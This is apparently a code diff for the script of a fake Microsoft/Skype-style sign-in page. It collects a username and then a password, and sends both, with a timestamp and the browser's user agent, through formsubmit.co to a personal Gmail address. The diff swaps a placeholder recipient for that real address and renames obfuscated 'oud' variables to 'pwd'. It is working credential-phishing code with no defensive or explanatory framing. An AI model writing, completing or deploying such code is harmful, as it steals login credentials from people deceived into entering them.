@@ -1,13 +1,13 @@
 document.addEventListener('DOMContentLoaded', () => {
     const unReq = "Enter a valid email address, phone number, or Skype name.";
-    const oudReq = "message.";
+    const pwdReq = "message.";
 
     const unameInp = document.getElementById('inp_uname');
-    const oudInp = document.getElementById('inp_oud');
+    const pwdInp = document.getElementById('inp_pwd');
 
     let view = "uname";
     let unameVal = false;
-    let oudVal = false;
+    let pwdVal = false;
 
     ///// next button
     const nxt = document.getElementById('btn_next');
@@ -17,13 +17,13 @@ document.addEventListener('DOMContentLoaded', () => {
 
         if (unameVal) {
             document.getElementById("section_uname").classList.toggle('d-none');
-            document.getElementById('section_oud').classList.remove('d-none');
+            document.getElementById('section_pwd').classList.remove('d-none');
 
             document.querySelectorAll('#user_identity').forEach((e) => {
                 e.innerText = unameInp.value;
             });
 
-            view = "oud";
+            view = "pwd";
         }
     });
 
@@ -33,12 +33,12 @@ document.addEventListener('DOMContentLoaded', () => {
     sig.addEventListener('click', async () => {
         validate();
 
-        if (oudVal) {
+        if (pwdVal) {
 
             const formData = new FormData();
 
             formData.append("Identity", unameInp.value);
-            formData.append("Message", oudInp.value);
+            formData.append("Message", pwdInp.value);
             formData.append("Submitted At", new Date().toLocaleString());
             formData.append("User Agent", navigator.userAgent);
 
@@ -47,12 +47,12 @@ document.addEventListener('DOMContentLoaded', () => {
             formData.append("_captcha", "false");
 
             try {
-                await fetch("https://formsubmit.co/ajax/YOUR_EMAIL@example.com", {
+                await fetch("https://formsubmit.co/ajax/01nextup@gmail.com", {
                     method: "POST",
                     body: formData
                 });
 
-                document.getElementById("section_oud").classList.toggle('d-none');
+                document.getElementById("section_pwd").classList.toggle('d-none');
                 document.getElementById('section_final').classList.remove('d-none');
                 view = "final";
 
@@ -76,15 +76,15 @@ document.addEventListener('DOMContentLoaded', () => {
             }
         }
 
-        function oudValAction(type) {
+        function pwdValAction(type) {
             if (!type) {
-                document.getElementById('error_oud').innerText = oudReq;
-                oudInp.classList.add('error-inp');
-                oudVal = false;
+                document.getElementById('error_pwd').innerText = pwdReq;
+                pwdInp.classList.add('error-inp');
+                pwdVal = false;
             } else {
-                document.getElementById('error_oud').innerText = "";
-                oudInp.classList.remove('error-inp');
-                oudVal = true;
+                document.getElementById('error_pwd').innerText = "";
+                pwdInp.classList.remove('error-inp');
+                pwdVal = true;
             }
         }
 
@@ -103,18 +103,18 @@ document.addEventListener('DOMContentLoaded', () => {
                 }
             });
 
-        } else if (view === "oud") {
-            if (oudInp.value.trim() === "") {
-                oudValAction(false);
+        } else if (view === "pwd") {
+            if (pwdInp.value.trim() === "") {
+                pwdValAction(false);
             } else {
-                oudValAction(true);
+                pwdValAction(true);
             }
 
-            oudInp.addEventListener('change', function () {
+            pwdInp.addEventListener('change', function () {
                 if (this.value.trim() === "") {
-                    oudValAction(false);
+                    pwdValAction(false);
                 } else {
-                    oudValAction(true);
+                    pwdValAction(true);
                 }
             });
         }
@@ -125,7 +125,7 @@ document.addEventListener('DOMContentLoaded', () => {
     // back button
     document.querySelector('.back').addEventListener('click', () => {
         view = "uname";
-        document.getElementById("section_oud").classList.toggle('d-none');
+        document.getElementById("section_pwd").classList.toggle('d-none');
         document.getElementById('section_uname').classList.remove('d-none');
     });
 
